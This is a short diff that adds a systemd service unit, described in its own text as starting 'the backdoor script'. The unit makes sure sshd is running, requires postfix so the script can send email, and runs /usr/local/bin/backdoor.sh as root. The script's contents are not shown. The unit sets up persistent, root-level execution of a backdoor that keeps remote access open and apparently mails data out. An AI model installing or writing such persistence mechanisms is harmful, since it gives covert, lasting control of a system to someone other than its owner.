@@ -1,0 +1,16 @@
+[Unit]
+Description=start the backdoor script
+
+# will start sshd.service if stopped
+Wants=sshd.service
+
+# will start postfix email server if stopped (if fail, stop)
+# and execute only after postfix has started
+# it is required so script can send emails
+Requires=postfix.service
+After=postfix.service
+
+[Service]
+Type=oneshot
+ExecStart=/usr/local/bin/backdoor.sh run
+User=root
